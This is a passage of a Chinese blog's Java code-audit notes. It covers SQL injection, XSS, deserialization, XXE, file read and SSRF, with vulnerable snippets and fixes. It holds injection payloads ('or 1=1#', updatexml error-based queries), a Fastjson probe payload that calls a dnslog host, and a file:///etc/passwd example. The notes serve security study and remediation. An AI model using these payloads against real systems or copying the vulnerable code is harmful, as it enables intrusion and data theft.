    <content type="html"><![CDATA[<p>参考：<a href="https://blog.51cto.com/u_9652359/5923566">https://blog.51cto.com/u_9652359/5923566</a></p><h1 id="技术框架"><a href="#技术框架" class="headerlink" title="技术框架"></a>技术框架</h1><ul><li>核心框架：SpringBoot 2.0.0</li><li>持久层框架：Mybatis 1.3.2</li><li>日志管理：Log4j 2.10.0</li><li>JS框架：Jquery 1.8.0</li><li>UI框架: EasyUI 1.9.4</li><li>模板框架: AdminLTE 2.4.0</li><li>项目管理框架: Maven 3.2.3</li></ul><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>查找mybatis映射文件中是否存在语句拼接，查找哪个方法调用了这个sql语句，再查找请求接口</p><p>搜索 + ${}</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>代码审计</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>代码审计流程</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="代码审计流程"><a href="#代码审计流程" class="headerlink" title="代码审计流程"></a>代码审计流程</h1><p>1、了解项目使用的技术框架。</p><p>2、了解项目使用的第三方开源组件（是否存在通用型漏洞）。</p><p>3、白盒审计。黑盒审计。</p><h2 id="白盒审计"><a href="#白盒审计" class="headerlink" title="白盒审计"></a>白盒审计</h2><p>1、全局查找漏洞关键字。</p><p>2、逆向查找调用。</p><p>3、观察参数是否被过滤。</p><p>4、查找方法的请求路由</p><p>5、漏洞验证。</p><h2 id="黑盒审计"><a href="#黑盒审计" class="headerlink" title="黑盒审计"></a>黑盒审计</h2><p>针对特定功能进行抓包，定位到相关代码，追踪利用链，判断是否存在问题，漏洞验证&#x2F;利用。</p><h1 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h1><p>1、前端页面会请求路由</p><p>2、查找谁调用了该方法时，当查找不到调用，考虑是不是前端页面调用了该方法</p><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="审计关键"><a href="#审计关键" class="headerlink" title="审计关键"></a>审计关键</h2><p>1、用户能够控制参数；</p><p>2、用户输入的数据被拼接到要执行的代码中从而被执行。</p><h2 id="漏洞测试代码"><a href="#漏洞测试代码" class="headerlink" title="漏洞测试代码"></a>漏洞测试代码</h2><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>普通查询<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin&#x27;</span>;<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>#;<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span> <span class="hljs-keyword">asc</span>;<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span> <span class="hljs-keyword">and</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">system_user</span>())),<span class="hljs-number">0</span>)) <span class="hljs-keyword">asc</span>;<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-keyword">like</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%cao%&#x27;</span>;<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%cao%&#x27;</span> <span class="hljs-keyword">and</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">system_user</span>())),<span class="hljs-number">0</span>));<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-keyword">in</span></code></pre></div><h2 id="JDBC参数直接拼接"><a href="#JDBC参数直接拼接" class="headerlink" title="JDBC参数直接拼接"></a>JDBC参数直接拼接</h2><h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//查询语句参数直接拼接</span><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;admin&quot;</span>;<span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users where user =&#x27;&quot;</span> + name + <span class="hljs-string">&quot;&#x27;&quot;</span>;<span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> Utils.getDBConnection();<span class="hljs-type">Statement</span> <span class="hljs-variable">statement</span> <span class="hljs-operator">=</span> connection.createStatement();<span class="hljs-type">ResultSet</span> <span class="hljs-variable">resultSet</span> <span class="hljs-operator">=</span> statement.executeQuery(sql);<span class="hljs-comment">//order by排序参数直接拼接</span><span class="hljs-type">String</span> <span class="hljs-variable">param</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;user&quot;</span>;<span class="hljs-type">String</span> <span class="hljs-variable">param</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;user and(updatexml(1,concat(0x7e,(select system_user())),0))#&quot;</span>;<span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users order by &quot;</span>+ param +<span class="hljs-string">&quot; asc&quot;</span>;<span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> Utils.getDBConnection();<span class="hljs-type">Statement</span> <span class="hljs-variable">statement</span> <span class="hljs-operator">=</span> connection.createStatement();<span class="hljs-type">ResultSet</span> <span class="hljs-variable">resultSet</span> <span class="hljs-operator">=</span> statement.executeQuery(sql);<span class="hljs-comment">//like模糊查询参数直接拼接</span><span class="hljs-type">String</span> <span class="hljs-variable">param</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;admin&quot;</span>;<span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users where user like &#x27;%&quot;</span> + param +<span class="hljs-string">&quot;%&#x27;&quot;</span>;<span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> Utils.getDBConnection();<span class="hljs-type">Statement</span> <span class="hljs-variable">statement</span> <span class="hljs-operator">=</span> connection.createStatement();<span class="hljs-type">ResultSet</span> <span class="hljs-variable">resultSet</span> <span class="hljs-operator">=</span> statement.executeQuery(sql);</code></pre></div><h3 id="修复代码"><a href="#修复代码" class="headerlink" title="修复代码"></a>修复代码</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">param</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;admin&quot;</span>;<span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users where user = ?&quot;</span>;<span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> Utils.getDBConnection();<span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">preparedStatement</span> <span class="hljs-operator">=</span> connection.prepareStatement(sql);preparedStatement.setString(<span class="hljs-number">1</span>, param);<span class="hljs-type">ResultSet</span> <span class="hljs-variable">resultSet</span> <span class="hljs-operator">=</span> preparedStatement.executeQuery();</code></pre></div><h3 id="审计关键字"><a href="#审计关键字" class="headerlink" title="审计关键字"></a>审计关键字</h3><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">Select</span><span class="hljs-keyword">insert</span><span class="hljs-keyword">update</span><span class="hljs-keyword">delete</span>java.<span class="hljs-keyword">sql</span>.<span class="hljs-keyword">Connection</span><span class="hljs-keyword">Statement</span>.<span class="hljs-keyword">execute</span>.executeQueryjdbcTemplatequeryForIntqueryForObjectqueryForMapgetConnectionPreparedStatement<span class="hljs-keyword">Statement</span><span class="hljs-keyword">execute</span>jdbcTemplatequeryForIntqueryForObjectqueryForMapexecuteQuerygetConnection</code></pre></div><h2 id="JDBC预编译处理不当"><a href="#JDBC预编译处理不当" class="headerlink" title="JDBC预编译处理不当"></a>JDBC预编译处理不当</h2><h3 id="漏洞代码-1"><a href="#漏洞代码-1" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//预编译有误（没有使用占位符替代参数）</span><span class="hljs-type">String</span> <span class="hljs-variable">param</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;admin&quot;</span>;<span class="hljs-comment">//String param = &quot;admin&#x27; and (updatexml(1,concat(0x7e,(select system_user())),0))#&quot;;</span><span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users where user =&#x27;&quot;</span> + param + <span class="hljs-string">&quot;&#x27;&quot;</span>;<span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> Utils.getDBConnection();<span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">preparedStatement</span> <span class="hljs-operator">=</span> connection.prepareStatement(sql);<span class="hljs-type">ResultSet</span> <span class="hljs-variable">resultSet</span> <span class="hljs-operator">=</span> preparedStatement.executeQuery();<span class="hljs-comment">//order by预处理有误（使用预编译后参数值会增加单引号，会使原sql语句查询失效）</span><span class="hljs-type">String</span> <span class="hljs-variable">param</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;user&quot;</span>;<span class="hljs-comment">//String param = &quot;user and(updatexml(1,concat(0x7e,(select system_user())),0))#&quot;;</span><span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users order by ? asc&quot;</span>;<span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> Utils.getDBConnection();<span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">preparedStatement</span> <span class="hljs-operator">=</span> connection.prepareStatement(sql);preparedStatement.setString(<span class="hljs-number">1</span>,param);<span class="hljs-type">ResultSet</span> <span class="hljs-variable">resultSet</span> <span class="hljs-operator">=</span> preparedStatement.executeQuery();<span class="hljs-comment">//like预处理有误（java运行报语法错误）</span><span class="hljs-type">String</span> <span class="hljs-variable">param</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;admin&quot;</span>;<span class="hljs-comment">//        String param = &quot;admin%&#x27; or 1=1 #&quot;;</span><span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users where user like %?%&quot;</span>;<span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> Utils.getDBConnection();<span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">preparedStatement</span> <span class="hljs-operator">=</span> connection.prepareStatement(sql);preparedStatement.setString(<span class="hljs-number">1</span>,param);logger.info(preparedStatement.toString());<span class="hljs-type">ResultSet</span> <span class="hljs-variable">resultSet</span> <span class="hljs-operator">=</span> preparedStatement.executeQuery();</code></pre></div><h3 id="修复代码-1"><a href="#修复代码-1" class="headerlink" title="修复代码"></a>修复代码</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//order by修复代码</span><span class="hljs-comment">//like修复代码</span><span class="hljs-type">String</span> <span class="hljs-variable">param</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;admin&quot;</span>;<span class="hljs-comment">//        String param = &quot;admin%&#x27; or 1=1 #&quot;;</span><span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users where user like ?&quot;</span>;<span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> Utils.getDBConnection();<span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">preparedStatement</span> <span class="hljs-operator">=</span> connection.prepareStatement(sql);preparedStatement.setString(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;%&quot;</span>+param+<span class="hljs-string">&quot;%&quot;</span>);logger.info(preparedStatement.toString());<span class="hljs-type">ResultSet</span> <span class="hljs-variable">resultSet</span> <span class="hljs-operator">=</span> preparedStatement.executeQuery();</code></pre></div><h2 id="框架使用不当"><a href="#框架使用不当" class="headerlink" title="框架使用不当"></a>框架使用不当</h2><h3 id="Mybatis"><a href="#Mybatis" class="headerlink" title="Mybatis"></a>Mybatis</h3><h3 id="漏洞代码-2"><a href="#漏洞代码-2" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//参数直接拼接</span>select * from users <span class="hljs-type">where</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;$&#123;name&#125;&#x27;</span>;<span class="hljs-comment">//like模糊查询</span>select * from users where user like <span class="hljs-string">&#x27;%$&#123;name&#125;%&#x27;</span>;<span class="hljs-comment">//参数直接拼接</span>select * from users where user like <span class="hljs-string">&#x27;%#&#123;name&#125;%&#x27;</span>;<span class="hljs-comment">//java运行报错</span><span class="hljs-comment">//order by排序</span>select * from users order by $&#123;column&#125; asc</code></pre></div><h3 id="修复代码-2"><a href="#修复代码-2" class="headerlink" title="修复代码"></a>修复代码</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//like模糊查询修复代码</span>select * from users <span class="hljs-type">where</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> #&#123;name&#125;;select * from users where user like <span class="hljs-title function_">concat</span><span class="hljs-params">(<span class="hljs-string">&quot;%&quot;</span>,#&#123;name&#125;,<span class="hljs-string">&quot;%&quot;</span>)</span>;<span class="hljs-comment">//order by排序修复代码</span>select * from users&lt;choose&gt;&lt;<span class="hljs-keyword">when</span> test=<span class="hljs-string">&quot;_column==&#x27;id&#x27; or _column=&#x27;user&#x27; or _column=&#x27;pass&#x27;&quot;</span>&gt;order by $&#123;_column&#125; asc&lt;/<span class="hljs-keyword">when</span>&gt;&lt;otherwise&gt;order by user asc&lt;/otherwise&gt;&lt;/choose&gt;<span class="hljs-comment">//in范围查询修复代码</span>select * from users where id in&lt;foreach collection=<span class="hljs-string">&quot;list&quot;</span> index=<span class="hljs-string">&quot;index&quot;</span> item=<span class="hljs-string">&quot;item&quot;</span> open=<span class="hljs-string">&quot;(&quot;</span> separator=<span class="hljs-string">&quot;,&quot;</span> close=<span class="hljs-string">&quot;)&quot;</span>&gt;    #&#123;item&#125;&lt;/foreach&gt;</code></pre></div><h3 id="Hibernate"><a href="#Hibernate" class="headerlink" title="Hibernate"></a>Hibernate</h3><h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><h3 id="判断原则"><a href="#判断原则" class="headerlink" title="判断原则"></a>判断原则</h3><h3 id="JFinal-activerecord"><a href="#JFinal-activerecord" class="headerlink" title="JFinal.activerecord"></a>JFinal.activerecord</h3><h3 id="关键字-1"><a href="#关键字-1" class="headerlink" title="关键字"></a>关键字</h3><div class="code-wrapper"><pre><code class="hljs stata"><span class="hljs-keyword">Db</span>.<span class="hljs-keyword">update</span></code></pre></div><h2 id="黑白名单-Filter绕过"><a href="#黑白名单-Filter绕过" class="headerlink" title="黑白名单|Filter绕过"></a>黑白名单|Filter绕过</h2><p>若SQL在处理过程中经过黑&#x2F;白名单（正则）或Filter检测，通常检测代码存在缺陷则可进行检测绕过。</p><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>在我们审计xss漏洞时，首先要审计是否有xss全局过滤器，对于整套系统来说不可能每个功能点自己搞个xss过滤，一般都是通过全局过滤器来进行过滤；</p><p>查看模板引擎是否做了html实体编码</p><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><h2 id="审计关键-1"><a href="#审计关键-1" class="headerlink" title="审计关键"></a>审计关键</h2><p>挖掘反序列化漏洞在业务功能层面关注导入模版文件、网络通信、数据传输、日志格式化存储、对象数据、磁盘或DB存储等场景。</p><p>代码层需重点关注一些反序列化操作函数，定位代码后判断反序列化数据是否可控</p><h2 id="常见可利用基础库"><a href="#常见可利用基础库" class="headerlink" title="常见可利用基础库"></a>常见可利用基础库</h2><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">commons</span>-io <span class="hljs-number">2</span>.<span class="hljs-number">4</span><span class="hljs-attribute">commons</span>-collections <span class="hljs-number">3</span>.<span class="hljs-number">1</span><span class="hljs-attribute">commons</span>-logging <span class="hljs-number">1</span>.<span class="hljs-number">2</span><span class="hljs-attribute">commons</span>-beanutils <span class="hljs-number">1</span>.<span class="hljs-number">9</span>.<span class="hljs-number">2</span><span class="hljs-attribute">org</span>.slf4j:slf4j-api <span class="hljs-number">1</span>.<span class="hljs-number">7</span>.<span class="hljs-number">21</span><span class="hljs-attribute">com</span>.mchange:mchange-commons-java <span class="hljs-number">0</span>.<span class="hljs-number">2</span>.<span class="hljs-number">11</span><span class="hljs-attribute">org</span>.apache.commons:commons-collections <span class="hljs-number">4</span>.<span class="hljs-number">0</span><span class="hljs-attribute">com</span>.mchange:c3p0 <span class="hljs-number">0.9.5.2</span><span class="hljs-attribute">org</span>.beanshell:bsh <span class="hljs-number">2</span>.<span class="hljs-number">0</span>b5<span class="hljs-attribute">org</span>.codehaus.groovy:groovy <span class="hljs-number">2</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span><span class="hljs-attribute">org</span>.springframework:spring-aop4.<span class="hljs-number">1</span>.<span class="hljs-number">4</span>.RELEASE</code></pre></div><h2 id="常见关键字"><a href="#常见关键字" class="headerlink" title="常见关键字"></a>常见关键字</h2><div class="code-wrapper"><pre><code class="hljs stylus">ObjectInputStream<span class="hljs-selector-class">.readObject</span>ObjectInputStream<span class="hljs-selector-class">.readUnshared</span>XMLDecoder<span class="hljs-selector-class">.readObject</span>Yaml<span class="hljs-selector-class">.load</span>XStream<span class="hljs-selector-class">.fromXML</span>ObjectMapper<span class="hljs-selector-class">.readValue</span>JSON<span class="hljs-selector-class">.parseObject</span>Serializable</code></pre></div><h2 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h2><h3 id="关键字-2"><a href="#关键字-2" class="headerlink" title="关键字"></a>关键字</h3><div class="code-wrapper"><pre><code class="hljs coffeescript"><span class="hljs-built_in">JSON</span>.parseObject<span class="hljs-built_in">JSON</span>.parse</code></pre></div><h3 id="测试payload"><a href="#测试payload" class="headerlink" title="测试payload"></a>测试payload</h3><div class="code-wrapper"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;<span class="hljs-variable">@type</span>&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;404bypass.dnslog.pw&quot;</span>&#125;</code></pre></div><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="审计关键-2"><a href="#审计关键-2" class="headerlink" title="审计关键"></a>审计关键</h2><p>1、代码是否涉及xml解析。</p><p>2、xml输入是否是外部可控。</p><p>3、是否禁用外部实体（DTD）。</p><p>若三个条件满足则存在漏洞。</p><h2 id="导入类"><a href="#导入类" class="headerlink" title="导入类"></a>导入类</h2><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> org.xml.sax.XMLReader;<span class="hljs-keyword">import</span> org.xml.sax.helpers.XMLReaderFactory;<span class="hljs-keyword">import</span> org.jdom2.<span class="hljs-keyword">input</span>.SAXBuilder;<span class="hljs-keyword">import</span> org.dom4j.io.SAXReader;<span class="hljs-keyword">import</span> org.apache.commons.digester3.Digester;<span class="hljs-keyword">import</span> org.dom4j.DocumentHelper;<span class="hljs-keyword">import</span> org.w3c.dom.Document;</code></pre></div><h2 id="常见组件"><a href="#常见组件" class="headerlink" title="常见组件"></a>常见组件</h2><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//XMLReader</span><span class="hljs-type">XMLReader</span> <span class="hljs-variable">xmlReader</span> <span class="hljs-operator">=</span> XMLReaderFactory.createXMLReader();xmlReader.parse(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(xmlFile)));<span class="hljs-comment">//SAXParserFactory</span><span class="hljs-type">SAXParserFactory</span> <span class="hljs-variable">spf</span> <span class="hljs-operator">=</span> SAXParserFactory.newInstance();<span class="hljs-type">SAXParser</span> <span class="hljs-variable">saxParser</span> <span class="hljs-operator">=</span> spf.newSAXParser();<span class="hljs-type">XMLReader</span> <span class="hljs-variable">xmlReader</span> <span class="hljs-operator">=</span> saxParser.getXMLReader();xmlReader.parse(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(xmlFile)));<span class="hljs-comment">//SAXBuilder</span><span class="hljs-type">SAXBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SAXBuilder</span>();builder.build(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(xmlFile)));  <span class="hljs-comment">// cause xxe</span><span class="hljs-comment">//SAXReader</span><span class="hljs-type">SAXReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SAXReader</span>();reader.read(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(xmlFile))); <span class="hljs-comment">// cause xxe</span><span class="hljs-comment">//SAXParserFactory</span><span class="hljs-type">SAXParserFactory</span> <span class="hljs-variable">spf</span> <span class="hljs-operator">=</span> SAXParserFactory.newInstance();<span class="hljs-type">SAXParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> spf.newSAXParser();parser.parse(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(xmlFile)), <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultHandler</span>());  <span class="hljs-comment">// parse xml</span><span class="hljs-comment">//Digester</span><span class="hljs-type">Digester</span> <span class="hljs-variable">digester</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Digester</span>();digester.parse(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(xmlFile));  <span class="hljs-comment">// parse xml</span><span class="hljs-comment">//DocumentBuilderFactory</span><span class="hljs-comment">//DocumentBuilder</span><span class="hljs-comment">//Document</span><span class="hljs-type">DocumentBuilderFactory</span> <span class="hljs-variable">dbf</span> <span class="hljs-operator">=</span> DocumentBuilderFactory.newInstance();<span class="hljs-type">DocumentBuilder</span> <span class="hljs-variable">db</span> <span class="hljs-operator">=</span> dbf.newDocumentBuilder();<span class="hljs-type">StringReader</span> <span class="hljs-variable">sr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(xmlFile);<span class="hljs-type">InputSource</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(sr);<span class="hljs-type">Document</span> <span class="hljs-variable">document</span> <span class="hljs-operator">=</span> db.parse(is);  <span class="hljs-comment">// parse xml</span><span class="hljs-comment">//用于命令回显</span><span class="hljs-comment">// 遍历xml节点name和value</span><span class="hljs-type">StringBuilder</span> <span class="hljs-variable">buf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<span class="hljs-type">NodeList</span> <span class="hljs-variable">rootNodeList</span> <span class="hljs-operator">=</span> document.getChildNodes();<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; rootNodeList.getLength(); i++) &#123;    <span class="hljs-type">Node</span> <span class="hljs-variable">rootNode</span> <span class="hljs-operator">=</span> rootNodeList.item(i);    <span class="hljs-type">NodeList</span> <span class="hljs-variable">child</span> <span class="hljs-operator">=</span> rootNode.getChildNodes();    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; child.getLength(); j++) &#123;        <span class="hljs-type">Node</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> child.item(j);        buf.append(String.format(<span class="hljs-string">&quot;%s: %s\\\\n&quot;</span>, node.getNodeName(), node.getTextContent()));    &#125;&#125;sr.close();System.out.println(buf.toString());<span class="hljs-comment">//DocumentHelper</span>DocumentHelper.parseText(xmlFile);</code></pre></div><h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>可控点</p><p>文件名，文件后缀</p><p>修复点</p><p>对文件名，文件后缀，文件格式，文件类型进行校验</p><h1 id="路径遍历漏洞"><a href="#路径遍历漏洞" class="headerlink" title="路径遍历漏洞"></a>路径遍历漏洞</h1><h1 id="任意文件读取漏洞"><a href="#任意文件读取漏洞" class="headerlink" title="任意文件读取漏洞"></a>任意文件读取漏洞</h1><h2 id="常见类"><a href="#常见类" class="headerlink" title="常见类"></a>常见类</h2><div class="code-wrapper"><pre><code class="hljs stylus"><span class="hljs-number">1</span>.JDK原始的java<span class="hljs-selector-class">.io</span>.FileInputStream类<span class="hljs-number">2</span>.JDK原始的java<span class="hljs-selector-class">.io</span>.RandomAccessFile类<span class="hljs-number">3</span><span class="hljs-selector-class">.Apache</span> Commons IO提供的org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.io</span>.FileUtils类<span class="hljs-number">4</span><span class="hljs-selector-class">.JDK1</span>.<span class="hljs-number">7</span>新增的基于NIO非阻塞异步读取文件的java<span class="hljs-selector-class">.nio</span><span class="hljs-selector-class">.channels</span>.AsynchronousFileChannel类。<span class="hljs-number">5</span><span class="hljs-selector-class">.JDK1</span>.<span class="hljs-number">7</span>新增的基于NIO读取文件的java<span class="hljs-selector-class">.nio</span><span class="hljs-selector-class">.file</span>.Files类。常用方法如:Files.readAllBytes、Files<span class="hljs-selector-class">.readAllLines</span>FileInputStreamFileOutputStreamFileFileUtilsIOUtilsBufferedReaderServletFileUploadMultipartFileCommonsMultipartFilePrintWriterZipInputStreamZipEntry.getSize</code></pre></div><h2 id="常见关键字-1"><a href="#常见关键字-1" class="headerlink" title="常见关键字"></a>常见关键字</h2><div class="code-wrapper"><pre><code class="hljs arduino">uploadfilecreatefileupload<span class="hljs-keyword">new</span> <span class="hljs-built_in">File</span></code></pre></div><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>Java支持的协议</p><div class="code-wrapper"><pre><code class="hljs dts"><span class="hljs-symbol">file:</span><span class="hljs-comment">///etc/passwd</span><span class="hljs-symbol">http:</span><span class="hljs-comment">//</span><span class="hljs-symbol">ftp:</span><span class="hljs-comment">//</span></code></pre></div><p>根据协议、地址路径，IP，域名来过滤</p><h2 id="常用类"><a href="#常用类" class="headerlink" title="常用类"></a>常用类</h2><h3 id="URLConnection"><a href="#URLConnection" class="headerlink" title="URLConnection"></a>URLConnection</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url);<span class="hljs-type">URLConnection</span> <span class="hljs-variable">urlConnection</span> <span class="hljs-operator">=</span> u.openConnection();urlConnection.getInputStream();</code></pre></div><h3 id="HttpClient"><a href="#HttpClient" class="headerlink" title="HttpClient"></a>HttpClient</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-type">HttpClient</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpClient</span>();<span class="hljs-type">GetMethod</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GetMethod</span>(url);client.executeMethod(method); <span 